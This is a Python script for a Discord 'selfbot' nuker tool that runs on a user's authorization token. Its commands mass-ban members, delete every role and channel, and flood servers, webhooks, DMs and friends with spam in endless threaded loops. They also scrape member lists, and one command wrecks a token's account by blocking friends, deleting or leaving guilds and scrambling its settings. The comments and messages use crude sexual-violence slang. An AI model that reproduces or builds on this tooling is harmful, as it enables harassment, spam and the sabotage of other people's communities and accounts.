# This code is written by Shahzain completely, please do not take credits for it, the code is messy as fuck so plz ignore
### ================================ ###
#                Libs
### ================================ ###
from concurrent.futures import thread
from selfbot import ShahzainSelfBot
import string
import random
import discord
import json
import os
import threading
from discord.ext import commands
import asyncio
import pyfiglet
from colorama import Style
intents = discord.Intents.all()
intents.members = True
activity = discord.Activity(type=discord.ActivityType.listening,
                            name="Shahzain Self Bot - github.com/shahzain345/discord-selfbot")
client = commands.Bot(command_prefix="!",
                      case_insensitive=False, self_bot=True, intents=intents, activity=activity, status=discord.Status.dnd)
client.remove_command(name="help")


class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


def clearConsole(): return os.system(
    'cls' if os.name in ('nt', 'dos') else 'clear')


clearConsole()

print(pyfiglet.figlet_format("Shahzain SelfBot"))
print(f'{Style.BRIGHT}Created by Shahzain{Style.RESET_ALL}')
print(f'{bcolors.OKGREEN}[!] Welcome to Shahzain SelfBot')
token = input(
    f'{bcolors.OKGREEN}[>] Please enter your discord authorization token: \n>> ')
tokentwofa = False
if 'mfa' in token:  # MFA MEANS THE TOKEN HAS 2 FACTOR AUTHENTICATION
    tokentwofa = True
    print(
        f'{bcolors.WARNING}[?] Your token has 2FA On, please disable it if you want to rape the token completely')
selfbot = ShahzainSelfBot(token=token)


@client.event
async def on_ready():
    os.system(f"title Shahzain Self Bot -  Connected as: {client.user}")
    print(f"{bcolors.OKGREEN}[>] Logged in as {client.user}")


@client.command(pass_context=True)
async def massban(ctx: commands.Context):
    await ctx.reply(content="Ok this server is about to be destroyed")
    threads = []
    for i in range(20):
        t = threading.Thread(target=massBan, args=(ctx.guild.id, ), daemon=True)
        t.start()
        threads.append(t)
    for i in range(20):
        threads[i].join()


@client.command(pass_context=True)
async def help(ctx: commands.Context):
    await ctx.reply(content="Please view the commands in https://github.com/shahzain345/discord-selfbot/blob/main/README.md")


@client.command(pass_context=True)
async def spamwebhook(ctx, arg1, arg2):
    if not arg1:
        print(f"Webhook not given")
    else:
        threads = []
        for _ in range(15):
            t = threading.Thread(target=selfbot.spamWebhook,
                                 args=(arg1, arg2), daemon=True)
            t.start()
            threads.append(t)
        for _ in range(15):
            threads[_].join()
        embed = discord.Embed(color=000)
        await ctx.reply(content=f"Spamming {arg1}")


@client.command(pass_context=True)
async def deleteallroles(ctx: commands.Context):
    await ctx.reply(content="Deleting all roles")
    threads = []
    for _ in range(15):
        t = threading.Thread(target=deleteroles, args=(
            ctx.guild.id, ), daemon=True)
        t.start()
        threads.append(t)
    for _ in range(15):
        threads[_].join()


@client.command(pass_context=True)
async def changebio(ctx: commands.Context, arg1):
    if arg1:
        await ctx.reply(content=f"Changing bio of this token to {arg1}")
        selfbot.changeBio(arg1)


@client.command(pass_context=True)
async def deleteallchannels(ctx: commands.Context):
    threads = []
    for _ in range(15):
        t = threading.Thread(target=deletechannels,
                             args=(ctx.guild.id, ), daemon=True)
        t.start()
        threads.append(t)
    for _ in range(15):
        threads[_].join()


@client.command(pass_context=True)
async def scrape(ctx: commands.Context):
    embed = discord.Embed(color=000)
    await ctx.reply(content="Scrapping Members From Server")
    selfbot.scrape(str(ctx.guild.id), str(ctx.channel.id))

@client.command(pass_context=True)
async def spamchannels(ctx: commands.Context, arg1):
    await ctx.reply(content="Creating Channels")
    threads = []
    for _ in range(15):
        t = threading.Thread(target=createChannels, args=(ctx.guild.id, arg1))
        t.start()
        threads.append(t)
    for _ in range(15):
        threads[_].join()


def createChannels(guildId, name):
    while True:
        selfbot.createChannel(guildId, name)


@client.command(pass_context=True)
async def spamroles(ctx: commands.Context, arg1):
    await ctx.reply(content="Creating Roles...")
    threads = []
    for _ in range(15):
        t = threading.Thread(target=createRoles,
                             args=(str(ctx.guild.id), arg1))
        t.start()
        threads.append(t)
    for _ in range(15):
        threads[_].join()


def createRoles(guildId, roleName):
    while True:
        selfbot.createRole(guildId, roleName)

deletedChannels = []
def deletechannels(guildId):
    while True:
        randChannel = random.choice(client.get_guild(guildId).channels).id
        if randChannel not in deletedChannels:
           selfbot.deleteChannel(randChannel)
           if randChannel not in deletedChannels:
               deletedChannels.append(randChannel)
        elif len(client.get_guild(guildId).channels) < len(deletedChannels) or len(client.get_guild(guildId).channels) == len(deletedChannels):
            return None


@client.command(pass_context=True)
async def rapetoken(ctx: commands.Context):
    embed = discord.Embed(color=000)
    await ctx.reply(content="This token is about to be raped hard lol")
    for user in client.user.friends:
        selfbot.sendDM(user.id, "This account is about to be raped hard lmao")
        selfbot.blockUser(user.id)
    threads = []
    for _ in range(5):
        t = threading.Thread(target=fuckToken, daemon=True)
        t.start()
        threads.append(t)
    for _ in range(5):
        threads[_].join()


@client.command(pass_context=True)
async def spamdms(ctx, arg1, arg2):
    await ctx.reply(content=f"Spamming {arg1} dms")
    threads = []
    for _ in range(5):
        t = threading.Thread(target=fuckdms, args=(arg1, arg2))
        threads.append(t)
        t.start()
    for _ in range(5):
        threads[_].join()


@client.command(pass_context=True)
async def spamfriends(ctx, arg1):
    await ctx.reply(content=f"Spamming all friends with this message {arg1}")
    threads = []
    for _ in range(5):
        t = threading.Thread(target=spamFriends, args=(arg1, ))
        t.start()
        threads.append(t)
    for _ in range(5):
        threads[_].join()


def spamFriends(msg):
    while True:
        randUser = random.choice(client.user.friends).id
        selfbot.sendDM(randUser, msg)


@client.command(pass_context=True)
async def disabletoken(ctx):
    await ctx.reply(content="This token is about to be locked/disabled")
    selfbot.disableToken()

@client.command(pass_context=True)
async def unbanall(ctx: commands.Context):
    bans = await ctx.guild.bans()
    await ctx.reply(content="Unbanning all members from this guild")
    for ban in bans:
        try:
         await ctx.guild.unban(ban.user)
         print(f"{bcolors.OKGREEN}[>] Unbanned {ban.user.id}")
        except:
            print(f"{bcolors.FAIL}[>] Failed to unban")
@client.command(pass_context=True)
async def sethypesquad(ctx: commands.Context, arg1):
    if arg1 == "balance":
        selfbot.changeHypeSquad(3)
        await ctx.reply(content=f"Set hypesquad to {arg1}")
    elif arg1 == "brilliance":
        selfbot.changeHypeSquad(2)
        await ctx.reply(content=f"Set hypesquad to {arg1}")
    elif arg1 == "bravery":
        selfbot.changeHypeSquad(1)
        await ctx.reply(content=f"Set hypesquad to {arg1}")


def fuckToken():  # this function here will fuck ur token entirely
    while True:
        try:
            guildName = ''.join(random.choice(string.ascii_letters)
                                for i in range(6)) + "-Shahzain-Self-Bot"
            selfbot.createGuilds(guildName)
            themes = ['light', 'dark']
            selfbot.setTheme(random.choice(themes))
            newBio = ''.join(random.choice(string.ascii_letters)
                             for i in range(3)) + " Shahzain-Self-Bot"
            selfbot.changeBio(newBio)
            msgTypes = ['MgOKAQA=', 'MgWKAQIIAQ==']
            selfbot.changeMsgDisplay(random.choice(msgTypes))
            hypesquadHouses = [1, 2, 3]
            selfbot.changeHypeSquad(random.choice(hypesquadHouses))
            langs = ['hi', 'en-US', 'en-UK', 'es-ES', 'zh-CN']
            selfbot.changeLang(random.choice(langs))
            devsettings = ['agQIARAB', 'agIIAQ==']
            selfbot.changeDevSettings(random.choice(devsettings))
            pngavatars = ['https://cdn.discordapp.com/attachments/921841026031837287/934154932796391504/northajao.png',
                          'https://cdn.discordapp.com/attachments/921841026031837287/934155295532408902/kale.png']
            selfbot.setAvatar(random.choice(pngavatars))
            randGuild = random.choice(client.guilds)
            if randGuild.owner_id == client.user.id:
                try:
                    if tokentwofa == False:
                        selfbot.deleteGuild(randGuild.id)
                    else:
                        print('[>] Cannot delete guild the token has 2FA ON')
                except:
                    print(f'[>] Failed to delete guild {randGuild.id}')
            else:
                selfbot.leaveGuild(randGuild.id)
        except:
            print('[>>] Error')


@client.command(pass_context=True)
async def pingallchannels(ctx: commands.Context, arg1):
    await ctx.reply(content="Spamming all guild channels")
    threads = []
    for _ in range(15):
        t = threading.Thread(target=fuckChannel, args=(ctx.guild.id, arg1))
        threads.append(t)
        t.start()
    for _ in range(15):
        threads[_].join()

deletedRoles = []
def deleteroles(guildId):
    while True:
        randRole = random.choice(client.get_guild(guildId).roles).id
        if randRole not in deletedRoles:
           selfbot.deleteRole(guildId, randRole)
           if randRole not in deletedRoles:
               deletedRoles.append(randRole)
        elif len(client.get_guild(guildId).roles) < len(deletedRoles) or len(client.get_guild(guildId).roles) == len(deletedRoles):
            return None
def getRandomGuildChannel(guildId):
    return random.choice(client.get_guild(guildId).channels).id
bannedMembers = []
def massBan(guildId):
    while True:
      with open("ids.json", "r") as file:
        data = json.load(file)
        randMember = random.choice(data)
        if randMember not in bannedMembers:
            selfbot.banMember(guildId, randMember)
            if randMember not in bannedMembers:
               bannedMembers.append(randMember)
        elif len(data) < len(bannedMembers) or len(data) == len(bannedMembers):
            return None


def fuckChannel(guildId, msg):
    while True:
        randChannel = getRandomGuildChannel(guildId)
        selfbot.sendMsgInGuildChannel(randChannel, msg)


def fuckChannelWithWebhook(channelId):
    webhook = selfbot.createWebhook(channelId)
    while True:
        selfbot.spamWebhook(webhook)


def fuckdms(userId, msg):
    while True:
        try:
            selfbot.sendDM(userId, msg)
        except:
            print(f'[>>] Error')


client.run(token, bot=False)